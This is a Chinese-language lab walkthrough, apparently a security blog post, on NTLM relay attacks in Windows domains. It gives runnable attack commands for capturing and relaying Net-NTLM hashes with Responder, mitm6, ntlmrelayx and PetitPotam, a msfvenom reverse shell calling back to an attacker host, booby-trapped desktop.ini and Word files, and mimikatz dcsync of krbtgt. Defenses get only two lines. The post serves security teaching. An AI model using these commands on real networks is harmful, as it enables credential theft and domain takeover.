## 一、域环境下的认证体系

`Windows`的身份认证方式有两种，一种是`NTLM`认证方式，即挑战/响应机制；另外一种就是`Kerberos`认证方式。

早期，`Windows`域环境下使用`NTLM`作为认证方式，后来采用了`Kerberos`协议。在默认环境下，`NTLM`认证和`Kerberos`认证同时存在于域环境下。当我们指定主机名的时候，会选用`Kerberos`来作为认证方式：![1639141432_61b35038123d530b4f4cf.png!small?1639141432819](https://image.3001.net/images/20211210/1639141432_61b35038123d530b4f4cf.png!small?1639141432819)

而当指定主机`ip`的时候，会采用`NTLM`认证方式。

![1639141471_61b3505fee7a2a0b9ee94.png!small?1639141472890](https://image.3001.net/images/20211210/1639141471_61b3505fee7a2a0b9ee94.png!small?1639141472890)

因此，在`Windows`域环境下，针对不同的认证机制，也存在不同的攻击手段。

这里主要讨论`NTLM`中继攻击，因此主要介绍一些`NTLM`认证协议。`NTLM`身份认证可以分为两种，一种是本地认证，一种是网络认证。

### （1）`NTLM`本地认证

`Windows`将用户的密码存储在本地计算机的`SAM`文件中，文件位置：`C:\Windows\System32\config\SAM`。密码的存储以`NTLM
Hash`的方式进行存储。当用户输入密码进行本地认证时，首先系统会将明文密码处理成`NTLM
Hash`，然后与`SAM`文件中的`Hash`进行比较，相同则认证通过。同时，会在`lsass.exe`进程中，保存一份明文密码。

这里也提到，`lsass`进程会缓存一份明文密码，当获取到一台主机权限之后，可以利用`mimikatz`从`lsass`进程中导出密码。

    
    
    sekurlsa::logonpasswords full

![1639141471_61b3505f950252752a3e7.png!small?1639141472891](https://image.3001.net/images/20211210/1639141471_61b3505f950252752a3e7.png!small?1639141472891)

### （2）`NTLM`网络认证

`NTLM`的网络认证，仔细细分可以分为工作组环境下的认证和域环境下的认证。大致原理相同，都是采用`Challenge/Response`验证机制。

在工作组环境下，`NTLM`认证主要分为三步：

![1639141488_61b35070e2d7691963f11.png!small?1639141488977](https://image.3001.net/images/20211210/1639141488_61b35070e2d7691963f11.png!small?1639141488977)

1）客户端首先会在本地缓存一份用户输入的密码值对应的`NTLM
Hash`，然后向服务端发送`Negotiate`协商消息，去指定需要协商认证的用户、机器以及其他相关信息。

2）服务端接收到`Negotiate`协商消息之后，会将数据传输给`NTLM
SSP`进行处理，然后获得一个返回的16位随机值，称之为`Challenge`，将其发送给客户端，并在本地缓存该`Challenge`。

3）客户端提取出来`Challenge`之后，使用本地缓存的`NTLM Hash`值对其进行加密，得到的值成为`Net-NTLM
Hash`，然后将该值封装到`Authenticate`认证消息中传输给服务端。

4）服务端收到认证消息之后，会使用自己的密码对应的`NTLM
Hash`值对本地缓存的`Challenge`进行哈希处理，然后将得到的值与认证消息中的`Net-NTLM Hash`进行比较，如果匹配则认证通过。

在域环境下，`NTLM`的认证方式与上面基本相同，唯一不同点是第4步，服务端会向域控请求校验。

![1639141515_61b3508bd3fae0c1252b2.png!small?1639141515987](https://image.3001.net/images/20211210/1639141515_61b3508bd3fae0c1252b2.png!small?1639141515987)

## 二、中继攻击原理解析

`NTLM Hash`值分为三种，分别为`NTLMv1`、`NTLMv2`、`NTLM session v2`，`Net-NTLM
Hash`根据不同的类型的`NTLM Hash`加密，可以分为`Net-NTLM Hash v1`和`Net-NTLM Hash v2`。其中，`NTLM
v1`强度比较低，易于破解，当获取到此`Net-NTLM Hash v1`值的时候，可以直接进行破解获取到明文。而`NTLM
v2`相对来说密码强度较高，可以进行暴力破解，但是需要比较强大的字典。通常情况下，`NTLM Hash`的值都是`NTLM
v2`，因此想要直接获取到明文，相对来说比较困难。因此，可以采用另外一种攻击方式，即`NTLM Relay`攻击。

`NTLM Relay`攻击其实就是攻击者转发客户端的所有请求给服务端，从而完成认证。这是一种中间人攻击的方式，其实也就是对获取到的`Net-NTLM
Hash`进行重放。

![1639141529_61b35099629f248d1bcac.png!small?1639141529493](https://image.3001.net/images/20211210/1639141529_61b35099629f248d1bcac.png!small?1639141529493)

攻击的关键是如何中间截获数据包，获取到`Net-NTLM Hash`值。下面介绍一些常见的捕获`Net-NTLM Hash`方法。

### （1）利用`LLMNR`和`NetBIOS`欺骗

`LLMNR`全称链路本地多播名称解析，是基于域名系统（`DNS`）数据包格式的协议，`IPv4`和`IPv6`的主机可以通过此协议对同一本地链路上的主机执行名称解析。简单理解为就是一种在局域网内寻找主机的协议。

`NetBios`全称网络基本输入输出系统，它提供了`OSI`模型中的会话层服务，让在不同计算机上运行的不同程序，可以在局域网中，互相连线，以及分享数据。`NetBIOS`也是计算机的标识名称，主要用于局域网内计算机的互访。`NetBIOS`的工作流程就是正常的机器名解析查询应答过程。在`Windows`操作系统中，默认情况下在安装`TCP/IP`协议后会自动安装`NetBIOS`。

`Windows`解析主机名的顺序为：

1）查看本地`hosts`文件

2）查看`DNS`缓存或者`DNS`服务器中进行查找

3）利用`LLMNR`（链路本地多播名称解析）和`NetBIOS`名称服务进行查找

在局域网环境下，当用户输入了一个不存在的，或者错误的，`DNS`中不存在的主机名的时候，`Windows`系统根据主机名解析的顺序开始查找，最终在局域网内广播`LLMNR/NBNS`数据包来请求解析主机名。

![1639141547_61b350ab7a8b330b44045.png!small?1639141548476](https://image.3001.net/images/20211210/1639141547_61b350ab7a8b330b44045.png!small?1639141548476)

而此时，如果我们以及拥有了一台局域网主机的权限，我们就可以假装成受害者想要访问的主机，从而让受害者交出凭证。

例如，使用`Responder`工具在局域网下开启监听，等待局域网内广播的数据包。

    
    
    responder -I eth0 -f -v

![1639141559_61b350b756ca3f42aa659.png!small?1639141559451](https://image.3001.net/images/20211210/1639141559_61b350b756ca3f42aa659.png!small?1639141559451)

然后我在域控主机上利用`SMB`协议随便访问一个不存在主机：`dir \\m1sn0w\c$`，之后监听主机就可以接收到返回来的`Net-NTLM
Hash`值：

![1639141573_61b350c55eb15ec843bf6.png!small?1639141574603](https://image.3001.net/images/20211210/1639141573_61b350c55eb15ec843bf6.png!small?1639141574603)

抓取流量包，可以看见，首先进行了广播，然后监听的攻击机（10.10.10.24）响应域控，告诉自己是`m1sn0w`主机。之后两台机器进行了`NTLM`认证，域控主机向攻击机发送了`Net-NTLM Hash`：

![1639141586_61b350d2d686c028edc1b.png!small?1639141587719](https://image.3001.net/images/20211210/1639141586_61b350d2d686c028edc1b.png!small?1639141587719)

### （2）利用`WPAD`劫持

`WPAD`全称为网络代理自动发现协议，它是客户端使用`DHCP`、`DNS`、`LLMNR`、`NBNS`协议来定位一个代理自动配置文件`URL`的方法。

代理自动配置文件（`PAC`），定义了浏览器或者其他代理如何选择适当的代理服务器来访问其要访问的`URL`。

也就是说，通过劫持`WPAD`，返回一个恶意构造好的`PAC`文件。然后客户端就会从这个`PAC`文件中去选择合适的代理服务器。由于远程`PAC`文件可以指定为攻击者自己的`V-P-S`服务器上的一个伪造文件，因此客户端的代理服务器也就被攻击者控制了。

`PAC`代理自动配置文件的格式如下，文件名为`wpad.dat`：

    
    
    function FindProxyForURL(url, host) {  
    if (url== 'http://www.baidu.com/') return 'DIRECT';  
    if (host== 'twitter.com') return 'SOCKS 127.0.0.10:7070';  
    if (dnsResolve(host) == '10.0.0.100') return 'PROXY 127.0.0.1:8086;DIRECT';  
    return 'DIRECT';  
    }

劫持`WPAD`一般有两种方式，一种是利用`LLMNR/NBNS`投毒，另外一种是利用`ipv6`协议，使用`DHCPv6`进行劫持。

#### 1）`LLMNR/NBNS`投毒

当浏览器设置了代理为`自动检测设置`后，用户访问一个`URL`的时候，主机就会向`WPAD/wpad.dat`发送查询请求。如果在域环境中，没有对`WPAD`主机进行配置，本地`hosts`文件和`DNS`服务器解析不到这个域名的话，就会通过`LLMNR`广播的方式，向局域网内的服务器询问该主机对应`ip`。

此时如果攻击者在局域网内，就可以伪造声称自己是`WPAD`主机，并返回给受害者`PAC`文件，其中的代理服务器可以指向攻击者自身。客户机收到`PAC`文件之后，所有的`HTTP`流量都会经过代理服务器，也就是攻击者的服务器，这也就达到了劫持流量的目的，开启了中间人攻击。

![1639141598_61b350deb78c0488e3c59.png!small?1639141599070](https://image.3001.net/images/20211210/1639141598_61b350deb78c0488e3c59.png!small?1639141599070)

`IE`浏览器默认配置为`自动检测代理`，当攻击机在局域网内监听流量之后，客户端打开`IE`浏览器并随机访问一个网页时，攻击者就可以伪造成`WPAD`，向其返回一个`PAC`文件，并将代理指向自己。

![1639141607_61b350e79d3ec4e75d509.png!small?1639141607798](https://image.3001.net/images/20211210/1639141607_61b350e79d3ec4e75d509.png!small?1639141607798)

#### 2）﻿`DHCPv6`

微软在2016年发布了`MS16-077`的补丁，添加了两个保护措施：

1、禁止系统通过广播协议来解析`WPAD`文件的位置，只能通过使用`DHCP`或者`DNS`协议来确定位置。

2、更改了`PAC`文件下载的默认行为，当通过`WinHTTP`请求`PAC`文件的时候，不会自动发送客户端的凭据来响应请求。

因此，为了绕过第一个限制，就可以采用`DHCP v6`的方式。

`DHCP V6`的交互方式：

1、客户端向组播地址发送`Solicit`请求报文

2、组播地址包括的整个地址链路范围内的`DHCP`服务器和中继代理回应一个`Advertise`消息给客户端。

3、客户端会选择优先级最高的服务器发送`Request`请求。

4、相应服务器回复确认地址、委托前缀、配置等信息。

也就是说，在`IPv6`的情况下，攻击者接收到其他机器的`DHCP
v6`组播包之后，可以让受害者的`DNS`服务器设置成攻击者`IPv6`地址。这样在进行`WPAD`查询的时候，就会像攻击者的主机发送请求。

利用`mitm6`工具，该工具自动检测攻击者计算机的`IP`配置，并以包含攻击者`IP`作为`DNS`服务器的`DHCPv6`应答回复网络中客户端发送的`DHCPv6`请求进行`DNS`欺骗，成功之后将目标主机的默认网关将设置成攻击机的`IPv6`地址。

工具下载地址：<https://github.com/dirkjanm/mitm6>

    
    
    python3 mitm6.py -d de1ay.com -i eth0

![1639141620_61b350f4a6b9719db0a5e.png!small?1639141620671](https://image.3001.net/images/20211210/1639141620_61b350f4a6b9719db0a5e.png!small?1639141620671)

第二个限制的绕过方式相对来说就比较简单，只需要在进行`HTTP`认证的时候，强制用户输入验证信息，即可。在使用`Responder`工具的时候，使用`-F`选项。

### （3）利用`desktop.ini`

每一个文件夹都含有一个隐藏文件`desktop.ini`，该文件的作用主要是用来定义文件夹图标之类的信息。在文件夹属性处，去掉相应选项就可以看见每个文件夹下面存在`desktop.ini`文件。

![1639141632_61b351004d6e7c3f2affc.png!small?1639141632604](https://image.3001.net/images/20211210/1639141632_61b351004d6e7c3f2affc.png!small?1639141632604)

![1639141641_61b35109c01da4189c598.png!small?1639141641875](https://image.3001.net/images/20211210/1639141641_61b35109c01da4189c598.png!small?1639141641875)

将这里的值设置为`UNC`路径，当其他用户访问此目录的时候，就会向指定的`UNC`请求图标资源。配合上面的`LLMNR/NBNS`投毒，即可获取到`Net-NTLM Hash`。

例如，这里我创建一个`m1sn0w`文件夹，然后将路径修改成`\\m1sn0w\c$`。利用`responder`在局域网内开启监听，当我再次打开`m1sn0w`文件夹的时候，攻击机就可以捕获到`Net-NTLM Hash`。

![1639141651_61b35113c84d58df0cb82.png!small?1639141651991](https://image.3001.net/images/20211210/1639141651_61b35113c84d58df0cb82.png!small?1639141651991)

### （4）利用`office`文件钓鱼

该利用方式也是利用`UNC`路径，当用户打开`Word`文档之后，就会自动向指定的`UNC`发送请求。制作方式：

创建一个`word`文档，然后添加一张图片进去：

![1639141664_61b35120a45269bbf4d12.png!small?1639141665159](https://image.3001.net/images/20211210/1639141664_61b35120a45269bbf4d12.png!small?1639141665159)

保存之后将文件后缀更改成`zip`，然后解压缩。在`word\_rels\document.xml.rels`中找到图片的位置，然后修改成`UNC`路径：

![1639141674_61b3512abc2b73835844c.png!small?1639141674780](https://image.3001.net/images/20211210/1639141674_61b3512abc2b73835844c.png!small?1639141674780)

修改属性值为`Target="\\m1sn0w\c$"
TargetMode="External"`，然后压缩之后修改后缀为`docx`。当用户打开该`word`文档之后，便会向局域网内发送广播数据包，攻击者就可以获取到`Net-NTLM Hash`：

![1639141686_61b3513694b6fbf01ce96.png!small?1639141686753](https://image.3001.net/images/20211210/1639141686_61b3513694b6fbf01ce96.png!small?1639141686753)

查看流量数据，可发现广播了数据包去询问主机`m1sn0w`:

![1639141697_61b351414a43a889b11b7.png!small?1639141697446](https://image.3001.net/images/20211210/1639141697_61b351414a43a889b11b7.png!small?1639141697446)

### （5）利用`Web`漏洞或者数据库

例如`XSS`漏洞，设置一个`UNC`路径，当客户端运行加载的时候，就会在局域网内进行广播：

    
    
    <script src="\\m1sn0w\c$" >

## 三、攻击面扩展

当获取到`Net-NTLM Hash`之后，接下来需要做的就是如何利用该哈希。`NTLM`是一种底层的认证协议，通常会将获取的`Net-NTLM
Hash`配合上层协议进行攻击。针对`Net-NTLM
Hash`的攻击方式有两种，一种就是直接对其进行暴力破解，另外一种就是通过重放的方式，`Relay`到其他机器上。（只要是支持`NTLM
SSP`的协议，都可以中继过去）一种比较常见的方式就是中继到`SMB`服务器上。（还可以中继到其他的服务，例如`EWS`、`LDAP`等）

如果能直接`Relay`到`SMB`服务器，就相当于可以直接控制目标服务器，可以在目标服务器上远程命令执行，文件上传，下载文件等操作。在域环境中，只有域控主机默认开启`SMB`签名，这是一种服务器与客户端协商以使用继承的会话密钥对所有传入的数据包进行数字签名的配置。

### （1）利用`MultiRelay.py`进行攻击

因此，在进行`Relay`攻击之前，可以通过`responder`工具包下的`RunFinger.py`脚本对域内主机的开放情况做一个探测：

    
    
    python3 RunFinger.py -i 10.10.10.1/24 

![1639141708_61b3514c2e992a4f8d2ab.png!small?1639141708547](https://image.3001.net/images/20211210/1639141708_61b3514c2e992a4f8d2ab.png!small?1639141708547)

可以看见只有域控主机开启了`SMB`签名，因此，接下来尝试通过捕获到域管的`Net-NTLM Hash`，然后中继到其他两台机器上进行命令执行。

利用`responder`工具包下的`MultiRelay.py`脚本进行攻击，如果`Relay`成功，可以直接获取到目标主机的`Shell`。这里我尝试`Relay`到`Win2008`上面，即`10.10.10.18`：

    
    
    python3 MultiRelay.py -t 10.10.10.18 -u ALL

然后在局域网内开启`responder`，此时要修改一下配置，不让`responder`抓取`Net-NTLM
Hash`，而由`MultiRelay`进行中继，关闭`SMB`和`HTTP`即可。（配置文件路径：`/usr/share/responder/Responder.conf`）

![1639141718_61b351567e9dd7316949e.png!small?1639141718713](https://image.3001.net/images/20211210/1639141718_61b351567e9dd7316949e.png!small?1639141718713)

之后我在域控上随机发送`SMB`流量，待攻击机监听后，转由`MultiRelay`进行中继，即可获取到目标主机的`Shell`。

![1639141730_61b35162aff4def759cae.png!small?1639141731242](https://image.3001.net/images/20211210/1639141730_61b35162aff4def759cae.png!small?1639141731242)

### （2）利用`smbrelayx.py`进行攻击

该工具的原理就是在本地临时搭建一个`SMB`服务，当域内主机访问该主机时，就会截获`Net-NTLM Hash`，并中继到其他机器：

    
    
    python3 smbrelayx.py -h target_ip -c command

![1639141742_61b3516e8b16ae9ae59bf.png!small?1639141742640](https://image.3001.net/images/20211210/1639141742_61b3516e8b16ae9ae59bf.png!small?1639141742640)

### （3）利用`ntlmrelayx.py`进行攻击

工具下载地址：<https://github.com/SecureAuthCorp/impacket>

    
    
    python3 ntlmrelayx.py -t smb://10.10.10.18 -c whoami -smb2support

然后利用`responder`开启局域网内的监听，待域控主机发送广播数据报之后，攻击机响应数据报，截获域管的`Net-NTLM
Hash`之后，中继到`10.10.10.18`，与之进行通信。

![1639141756_61b3517c2b3c6390f9920.png!small?1639141756709](https://image.3001.net/images/20211210/1639141756_61b3517c2b3c6390f9920.png!small?1639141756709)

## 四、实网对抗下的中继打法

### 1、被动攻击方式

前面在中继攻击`SMB`的时候用到的`smbrelayx.py`脚本，它用于在本地临时搭建一个`SMB`服务，当域内其他用户访问这个服务的时候，就可以捕获`Net-NTLM Hash`，从而中继到其他机器上面。

但是在实际场景下，这种方法要实现起来比较困难。首先当前机器的445端口要没有被占用，一般在`Windows`操作系统下，445端口都是被占用的。其次就是需要目标机器存在`Python`环境。因此，如果在内网环境下，目标机器是`Linux`的话，可以考虑利用此方式。

实验拓扑环境如下：

![1639141767_61b35187071e33186fa26.png!small?1639141767216](https://image.3001.net/images/20211210/1639141767_61b35187071e33186fa26.png!small?1639141767216)

我在主机`10.10.10.24`上通过`smbrelayx.py`临时搭建一个`SMB`服务，然后将捕获的`Net-NTLM
Hash`中继到受害者机器`10.10.10.18`上面：

    
    
    python3 smbrelayx.py -h 10.10.10.18 -c whoami

当域内主机访问`10.10.10.24`的`SMB`，就会与其进行`NTLM`认证，然后捕获到`Net-NTLM Hash`之后，中继到其他机器：

![1639141779_61b351930a304dab4c03f.png!small?1639141779776](https://image.3001.net/images/20211210/1639141779_61b351930a304dab4c03f.png!small?1639141779776)

也可以和其他工具联动，例如可以通过`msfvenom`生成一个`shell.exe`，然后放置到攻击机上面。当中继攻击成功以后，可以让他下载本地的`shell.exe`并运行，这样，在`msf`中开启监听后，就可以获取到目标的`shell`。

    
    
    # 生成shell.exe  
    msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.10.24 LPORT=8899 -f exe -o shell.exe

然后使用`exploit/multi/handler`，配置`AutoRunScript`，当获取到`shell`让他进程自动迁移，避免`shell`文件被删除时连接的`shell`断开：

    
    
    set AutoRunScript post/windows/manage/migrate

![1639141790_61b3519ea5b369f069076.png!small?1639141790848](https://image.3001.net/images/20211210/1639141790_61b3519ea5b369f069076.png!small?1639141790848)

然后临时搭建`SMB`服务，利用`smbrelayx.py`的`-e`参数指定下载运行的文件路径，让获取到`Net-NTLM
Hash`之后，`msf`就会收到反弹获取的`shell`：

    
    
    python3 smbrelayx.py -h 10.10.10.18 -e ../../shell.exe

### 2、主动攻击方式

#### （1）`PortBender`流量重定向

在实际的网络拓扑环境下，一般都是通过团队服务器向目标主机上传一个`beacon`后获取权限。此时进行中继攻击就会存在几个问题，比如：目标445端口已经被占用，所以不能直接嗅探该端口传入的流量。又或者目标`Windows`主机上没有一些语言环境，操作不方便。

最简单的一种实网拓扑结构：图来自`https://rastamouse.me/ntlm-relaying-via-cobalt-strike/`

![1639141809_61b351b154756e86812b7.png!small?1639141809636](https://image.3001.net/images/20211210/1639141809_61b351b154756e86812b7.png!small?1639141809636)

`TeamServer`位于互联网。当目标主机通过`beacon`控制之后，如果要利用`NTLM
Relay`攻击中继到内网的其他机器，最简单的做法就像上面那样，开启监听之后`Relay`到其他机器，但这里存在的一个问题是，如果目标机器的445端口占用了，也就是说不能直接监听到445的流量，同时，内网环境下，目标通常是`Windows`操作系统，如果没有装`Python`，那么有一些工具就不能运行。

因此，在对抗过程中，可以使用端口流量的重定向，以及流量转发，代理来实现攻击机通过`TeamServer`攻击内网。

`PortBender`工具可以用于端口流量的重定向，工具地址：`https://github.com/praetorian-inc/PortBender`，将`PortBender.cna`导入到`Cobalt Strike`中。

当获取一个`SYSTEM`权限的`beacon`之后，通过`upload`命令将`WinDivert64.sys`或者`WinDivert32.sys`上传到目标主机（根据目标主机的类型），然后执行:

    
    
    PortBender redirect 445 8445

此时会将445端口的流量重定向到8445端口，接下来配置`rportfwd`。

`Cobalt Strike`工具自带的`rportfwd`，用于远程端口转发，即将目标机器的某个端口流量全部转发到远端指定的一个端口，命令如下：

    
    
    rportfwd 8445 10.10.20.25 445

表示将此台（受控端）主机8445端口的流量转发到攻击机（10.10.20.25）的445端口上。也就是说445端口的流量此时通过重定向，发送给了8445端口，由于远程端口转发，本地8445端口流量全部转发到远程主机的445端口上。

此时设置一个代理，通过代理运行`nltmrelayx.py`进行中继攻击的监听：

    
    
    # 开启代理  
    socks 1080  
    ​  
    # 配置代理/etc/proxychains4.conf  
    socks4 10.10.20.24 1080  
    ​  
    # 中继攻击监听  
    proxychains python3 ntlmrelayx.py -t smb://10.10.10.18 -smb2support

当受控主机的`445`端口收到身份认证的流量之后，将会将流量传送到监听的远程攻击主机上，收到`Net-NTLM
Hash`之后，通过`socks`代理，就可以中继到内网的其他主机。

这里顺便提一下，就是此时域内主机主动连接该445端口，是不会进行认证的。（域内主机发送了一个询问流量之后，不会收到来自该主机的响应）因此，单纯利用这种方式被动的等待比较鸡肋。在这种情况下并不是进行被动收集`Net-NTLM Hash`，而是通过主动攻击的方式，利用一些漏洞，比如打印机漏洞，还有最近比较火的`PetitPotam`，主动向该端口发送`Net-NTLM
Hash`。

#### （2）利用`PetitPotam`中继`ADCS`接管域

由于`NTLM
Relay`不能够中继自己，所以利用这种方式进行攻击，更像是一种提权手段，在已知域内一台主机账号密码的情况下，可以让他向`CS`发送`NTLM`请求，获取一个证书。

最近内网攻防比较火的一种攻击方式，利用`PetitPotam`，强制域内主机发起`NTLM
Hash`，中继到`ADCS`获取证书，从中提取`TGT`，利用票据传递接管域控。

`PetitPotam`中继攻击，这是一种新型的`NTLM
Relay`攻击利用手法，其利用了微软加密文件系统远程协议。利用该漏洞，攻击者连接到`LSARPC`后能够强制触发目标机器向指定的远程服务器发送`Net-NTLM Hash`，在获取到`Net-NTLM Hash`之后，就能够进行`NTLM Relay`攻击。

而`ADCS`证书服务器在默认安装之后，由于`ADCS`的`HTTP`证书接口（`/certsrv/certfnsh.asp`）没有启用`NTLM`中继保护，并且在`HTTP`请求的时候，`Authorization
HTTP`标头明确指定只允许通过`NTLM`进行身份验证。因此，配合上面的`PetitPotam`的方式，强制域控向该接口发送`Net-NTLM
Hash`，从而可以获取到一个域内的证书，从中提取`TGT`，利用票据传递接管域控。

![1639141822_61b351be98647cbf4ef77.png!small?1639141822752](https://image.3001.net/images/20211210/1639141822_61b351be98647cbf4ef77.png!small?1639141822752)

在内网环境中，如果存在两个域控（一个主域控，一个辅助域控），都安装了`ADCS`证书服务的话，可以导出`TGT`，从而接管域控：（实验拓扑图）

![1639141831_61b351c7a771bfd80da39.png!small?1639141831794](https://image.3001.net/images/20211210/1639141831_61b351c7a771bfd80da39.png!small?1639141831794)

由于在`win2008`和`win2012`环境下，通过`PetitPotam`强制域控发起`Net-NTLM
Hash`可以以匿名的方式，也就是说不需要知道账号密码也可发送。

    
    
    python3 PetitPotam.py -d de1ay 10.10.10.25 10.10.10.99

强制辅助域控（10.10.10.99）向本机（10.10.10.25）的445端口发送`Net-NTLM Hash`，然后在本地主机上捕获到`Net-NTLM Hash`之后，发起中继攻击，中继到域控主机（10.10.10.10）的`ADCS`服务上申请一个证书：

    
    
    python3 ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs

![1639141842_61b351d2b759a10404efb.png!small?1639141843454](https://image.3001.net/images/20211210/1639141842_61b351d2b759a10404efb.png!small?1639141843454)

申请到证书之后，就可以通过`Rubeus`攻击从中提取出来`TGT`，转而接管域控：（这里假设`Win7`客户机已经被拿下，接下来操作在`Win7`上进行即可）

    
    
    Rubeus.exe asktgt /user:username /certificate:证书的base64值 /ptt

![1639141852_61b351dc3b1e8b6c45fcc.png!small?1639141852294](https://image.3001.net/images/20211210/1639141852_61b351dc3b1e8b6c45fcc.png!small?1639141852294)

通过`mimikatz`可以查看`kerberos`票据信息：`kerberos::list`，导出`krbtgt`的哈希值：`lsadump::dcsync
/user:krbtgt /csv`

![1639141862_61b351e6d096dd57c7a0f.png!small?1639141863077](https://image.3001.net/images/20211210/1639141862_61b351e6d096dd57c7a0f.png!small?1639141863077)

而现实的网络拓扑环境可能是这个样子：

![1639141872_61b351f0ec541f3be21fa.png!small?1639141873031](https://image.3001.net/images/20211210/1639141872_61b351f0ec541f3be21fa.png!small?1639141873031)

所有的流量都通过`Win7`客户机发送给内网主机。`Win7`客户机的445端口被占用，此时想要通过同样的方式，攻击域控的`ADCS`可以使用`PortBender`将`TCP`流量重定向。

具体攻击思路是将`Win7`上面的`445`端口流量重定向之后，`TeamServer`通过远程流量转发的方式，传回攻击者监听的445端口。攻击者开启`socks`代理，将流量传送到域控的80端口，请求获取一个证书。

我这里利用`Cobalt Strick`，拿到`Win7`客户机的一个`System`权限的`Beacon`后，开启一个`socks`代理：`socks
1080`，然后远程转发端口流量，将`8445`的流量全部转发到攻击者的`445`端口：

![1639141882_61b351fa39c8088cc1eaa.png!small?1639141882397](https://image.3001.net/images/20211210/1639141882_61b351fa39c8088cc1eaa.png!small?1639141882397)

之后上传`WinDivert32.sys`（我这里`Win7`是32位的），执行`PortBender redirect 445
8445`，将`Win7`上的`445`端口流量全部转发到8445端口。

![1639141891_61b3520313ada4318cecc.png!small?1639141891159](https://image.3001.net/images/20211210/1639141891_61b3520313ada4318cecc.png!small?1639141891159)

攻击机配置完代理之后，在攻击机上面开启攻击`ADCS`的脚本并监听来自445端口的流量：

    
    
    proxychains python3 ntlmrelayx.py -t http://10.10.10.10/certsrv/certfnsh.asp -smb2support --adcs

![1639141900_61b3520cc462923d113dc.png!small?1639141900915](https://image.3001.net/images/20211210/1639141900_61b3520cc462923d113dc.png!small?1639141900915)

然后通过代理的方式，利用`PetitPotm`向辅助域控发送流量，强制其发送`Net-NTLM Hash`给`Win7`的445端口：

    
    
    proxychains python3 PetitPotam.py -d de1ay 10.10.10.201 10.10.10.99

![1639141911_61b35217ba9c2608d3e41.png!small?1639141912131](https://image.3001.net/images/20211210/1639141911_61b35217ba9c2608d3e41.png!small?1639141912131)

由于网络问题，多发几次包之后，就可以获取到证书信息：

![1639141920_61b3522074a2c89223db6.png!small?1639141920752](https://image.3001.net/images/20211210/1639141920_61b3522074a2c89223db6.png!small?1639141920752)

## 五、中继攻击防御措施

1、开启签名保护

2、`EAP`（`Enhanced Protection Authentication`）``

## 六、总结

`NTLM
Relay`是一种中间人攻击的方式，一般而言都是被动攻击，等待连接操作，但`PetitPotam`的出现，发生了一些改变。正如上面实验，在两台域控都安装了`ADCS`的情况下，不需要被动等待即可发起攻击。

参考文章：

【委派攻击】<https://www.bugbank.cn/live/view.html?id=114136>

【利用`kerberos`身份验证中继攻击】<https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html>

【中继的实战打法】<https://rastamouse.me/ntlm-relaying-via-cobalt-strike/>

【证书服务器攻击与防御】<https://www.anquanke.com/post/id/245791#h2-11>

【`ExchangeRelayx`】<https://www.freebuf.com/news/184594.html>

【`Portbender`端口复用】<http://cn-sec.com/archives/437340.html>

【利用`PetitPotam`进行`NTLM
Relay`攻击】<https://blog.csdn.net/qq_36119192/article/details/120368697>

【无需`Linux`进行`NTLM Relay`】<https://cloud.tencent.com/developer/article/1896216>

